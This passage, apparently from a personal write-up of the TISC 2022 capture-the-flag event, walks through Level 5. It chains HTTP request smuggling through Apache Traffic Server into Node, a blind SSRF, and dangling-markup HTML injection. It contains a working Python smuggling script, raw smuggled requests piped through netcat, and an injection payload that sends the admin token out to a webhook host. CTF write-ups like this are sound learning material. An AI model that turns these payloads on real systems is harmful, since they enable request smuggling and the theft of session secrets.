This suggests to me that likely ATS 9.1 is vulnerable, and it is likely a HTTP Request Smuggling vulnerability. I focused my efforts into finding the closest I could, and found a few CVEs that had potential, but couldn't get anything working until I chanced upon [this Hackerone report](https://hackerone.com/reports/1238099) that made use of ATS 9.0 and node16.3.0, which was the exact version that this challenge was using for it's node on the backend.

`app/Dockerfile`
```
FROM node:16.3.0 <- AHA!
  
RUN apt-get update && \
apt-get install -y chromium dumb-init xvfb && \
rm -rf /var/lib/apt/lists/*
  
ENV NODE_ENV=production \
PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true \
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium
  
RUN addgroup inmate && \
adduser --disabled-password --gecos "" --ingroup inmate inmate
  
WORKDIR /home/inmate/app
COPY . ./
  
RUN chmod +x ./start.sh
  
RUN chown -R inmate:inmate .
USER inmate
RUN npm install && \
mkdir -p /home/inmate/Downloads
  
ENTRYPOINT ["/usr/bin/dumb-init", "--"]
CMD ["./start.sh"]
```

From what I could understand from the report, the parser within Node 16.3.0 ignores chunk extensions, whereas ATS 9.0 and 9.1 parses the chunk extension incorrectly, which leads to discrepencies between ATS and Node when put together, in those specific versions. I initially tried sending the following request through burp, but because Burp autostrips some newline characters, nothing was going through. 

... syntax highlights go out of the window once you start smuggling requests :'(...

```
GET /token HTTP/1.1
Host: 127.0.0.1
Cookie: connect.sid=s%3At2-6mG4S4l2iHgeONNuOL4UWTx9gJDRF.3lE7Aa7WgpNyYXJryBgJIewmw5d9oMJVc9Xsb58GonA
Transfer-Encoding: chunked

3;
xxx
12b
0

POST /do-report HTTP/1.1
Host: 127.0.0.1
Cookie: connect.sid=s%3At2-6mG4S4l2iHgeONNuOL4UWTx9gJDRF.3lE7Aa7WgpNyYXJryBgJIewmw5d9oMJVc9Xsb58GonA
Content-Type: application/json
Content-Length: 93

{"url": "http://example.com"}

0

```

I had to take the payload generator provided in the hackerone report and pipe it directly through netcat in order for the request to go through, and even then, I had to point the URL to a webhook to ascertain it was actually calling out to it. 

Now that we managed to knock down HTTP Request Smuggling and SSRF in one go (thank goodness the SSRF was straightforward, likely the only thing in this challenge that was straightforward), we need to figure out what we can do with a Blind SSRF in order to escalate it. 

A quick note here that calling any localhost endpoints require port 8000 to be specified. I found that out the hard way after questioning my sanity on why localhost was not responding before realising `http://app:8000` was a thing that proxy was calling as well.

### Escalating Blind SSRF via Dangling Markup HTML Injection

Let us now take a look at the other functions on the site, to see what we can do to escalate our Blind SSRF, and how we are going to get the flag. From source code review, we know that the flag is the admin token, and as long as the request originates from localhost (another telltale sign that SSRF was important) and the userId exists, the token was replaced with the flag instead.

`app/main.js`
```node
//...snipped for brevity...
const authenticationMiddleware = async (req, res, next) => {
    if (req.session.userId) {
        if (req.ip === '127.0.0.1')
            req.session.token = process.env.ADMIN_TOKEN
  
        next()
    }
    else
        return res.redirect('/login')
}
//...snipped for brevity...
```

We also know that you can enter a username and it will generate a token for you, which you can then take to verify on the verify token page. The username you chose will then be shown to you in a very nice green message if your token was verified. Let's have a look.

![[level5midpoint.png]]
![[level5midpoint2.png]]
![[level5midpoint3.png]]

Wait whatttt. It seems like the image tag got loaded in, but the javascript did not run. Looking into the console showed this error message:

```
Refused to load the image 'javascript:alert('XSS')' because it violates the following Content Security Policy directive: "img-src data: *". Note that '*' matches only URLs with network schemes ('http', 'https', 'ws', 'wss'), or URLs whose scheme matches `self`'s scheme. The scheme 'javascript:' must be added explicitly.
```

Inspecting the element shows that the image tag was injected successfully into the webpage, but it was blocked by CSP policies from executing any sort of javascript. I initially dived into the rabbithole of trying to bypass CSP policies, but reading the entire article on CSP bypass on [hacktricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass) and running the CSP policies through [CSP evaluator](https://csp-evaluator.withgoogle.com/))taught me that XSS was likely a no go in this instance.

`app/main.js`
```javascript
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none'; frame-ancestors 'none'"
    )
    res.setHeader(
        'Cross-Origin-Opener-Policy',
        'same-origin'
    )
    next()
})```

It is also worth noting that your token, as an administrator, or whoever the login session user is, was shown right after that as well. 
```html
<div class="alert alert-success" role="alert">
	This token belongs to <img src="JaVaScRiPt:alert('XSS')">.
	If <img src="JaVaScRiPt:alert('XSS')"> asks for your token, you can give them this token: TISC{f:5:6:z:p:k:p:o:d:k}.
</div>
```

Following a few days of headbanging, I saw a link on the hacktricks article, which led me to [Dangling Markup - HTML scriptless injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) instead, where you could steal clear text secrets from the page! The above code example looks perfect for it, so I quickly wrote up a dangling img src tag that could point to one of my webhooks and exfiltrate the data.

![[level5midpoint4.png]]
![[level5midpoint5.png]]
![[level5midpoint6.png]]

Of course, things were not going to be that simple, and I did not manage to get the token out :(
```html
<div class="alert alert-success" role="alert">
This token belongs to <img src="https://webhook.site/64c24c5f-100e-4d47-abf5-1a40d1e15e06?HTTP=. If <img src=" https:="" webhook.site="" 64c24c5f-100e-4d47-abf5-1a40d1e15e06?http="asks" for="" your="" token,="" you="" can="" give="" them="" this="" token:="" tisc{v:m:t:0:6:j:v:g:z:3}.<="" div=""><form action="/verify" method="get"><div class="form-group row"><label class="col-sm-2 col-form-label" for="token">Token</label><div class="col-sm-10"><input class="form-control" type="text" name="token" placeholder="Token"></div></div><button class="btn btn-primary my-3" type="submit" value="Verify">Verify</button></form></div>
```

From what we can see, the dangling markup was going to take all the characters until the next " appeared, but since the username was printed twice, it was encapsulated between the first and the second instance of the username appearing. One final squeeze of the brain resulted in adding closing tags at the start of the `<img src="..."` tag instead. Thus, the final payload look something like this: `"/><img src="https://<SOMEWEBHOOK>?HTTP="`

![[level5midpoint7.png]]
![[level5midpoint8.png]]

### Chaining It All Up

Now that we have a verified way to exfiltrate data on the page, we need to now chain the entire exploit chain all up together, and essentially do an SQLi to get the session token, use HTTP Request Smuggling to smuggle a SSRF to the `/verify` endpoint of the site, impersonating as the puppeteer user, to finally trigger the dangling markup injected on the page with the specific token generated, to finally exfiltrate the flag. Lets go!

I'll first setup all I need for the attack, by creating the malicious token.

![[level5endpoint1.png]]

Calling the verify endpoint will give me the exact link my SSRF needs to call, not forgetting to update my session token.

```http
GET /verify?token=TISC%7B2%3Aj%3Aw%3A9%3Ax%3Ay%3Ar%3A7%3A2%3A8%7D HTTP/1.1
Host: chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627/verify
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3A284MFK3ZMIhkfg8m2Wm3ka94v5uJczaB.zAGihGKGFr5BmxZ2rvmOGdf3o0rLB8VXsGSQjlB3yvY
Connection: close


```

Next up, to edit the python script that would trigger the entire flow.

`smuggle.py`
```python
import sys

form_body = b"{\"url\": \"http://localhost:8000/verify?token=TISC%7B2%3Aj%3Aw%3A9%3Ax%3Ay%3Ar%3A7%3A2%3A8%7D\"}"

smuggled = (
    b"POST /do-report HTTP/1.1\r\n" +
    b"Host: 127.0.0.1\r\n" +
    b"Cookie: connect.sid=s%3A284MFK3ZMIhkfg8m2Wm3ka94v5uJczaB.zAGihGKGFr5BmxZ2rvmOGdf3o0rLB8VXsGSQjlB3yvY\r\n" +
    b'Content-Type: application/json\r\n' +
    b"Content-Length: " + str(len(form_body)).encode() + b"\r\n" +
    b"\r\n" +
    form_body + b"\r\n"
    b"\r\n" +
    b"0\r\n" +
    b"\r\n"
)

def h(n):
    return hex(n)[2:].encode()

smuggled_len = h(len(smuggled) - 2)

first_chunk_len = h(len(smuggled_len))

sys.stdout.buffer.write(
    b"GET /token HTTP/1.1\r\n" +
    b"Host: 127.0.0.1\r\n" +
    b"Cookie: connect.sid=s%3A284MFK3ZMIhkfg8m2Wm3ka94v5uJczaB.zAGihGKGFr5BmxZ2rvmOGdf3o0rLB8VXsGSQjlB3yvY\r\n" +
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    first_chunk_len + b";\n" + b"x"*len(smuggled_len) + b"\r\n" +
    smuggled_len + b"\r\n" +
    b"0\r\n" +
    b"\r\n" +
    smuggled
)
```

Now all we have to do is run the script, and wait a bit. 
```bash
$ python3 smuggle.py | nc chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg 23627 
HTTP/1.1 400 Bad Request
Date: Mon, 12 Sep 2022 03:37:43 GMT
Age: 0
Transfer-Encoding: chunked
Connection: keep-alive
Server: ATS/9.1.0

0
```

We can see the request come in a little while later, which gives us the token we need.
![[level5endpoint2.png]]

Decoded HTTPS request
```https
https://webhook.site/64c24c5f-100e-4d47-abf5-1a40d1e15e06?http=   asks for your token, you can give them this token: TISC{1:3:3:7:l:3:4:k:1:n}.</div><form action=
```

Thus after a long chain of exploits, we finally arrive at the flag. This was such a thrill to experience from start to end, really well done challenge.

Flag:  TISC{1:3:3:7:l:3:4:k:1:n}

---

## Level 6 - Pwnlindrome

Jk. The moment I saw the paths converge back into RE I knew that was the end of the road for my TISC 2022 run. 

---

## Conclusion

This was a really fun competition, and the longer time period allocated for it meant that working professionals could set aside many sleepless nights working on it as well hehe. I actually appreciated the extended time periods that gave me the necessary time to slowly work out the intricacies of the challenges, which is something I found lacking for most other CTF competitions. I definitely learnt a lot from this, and it was a pretty fun run overall :D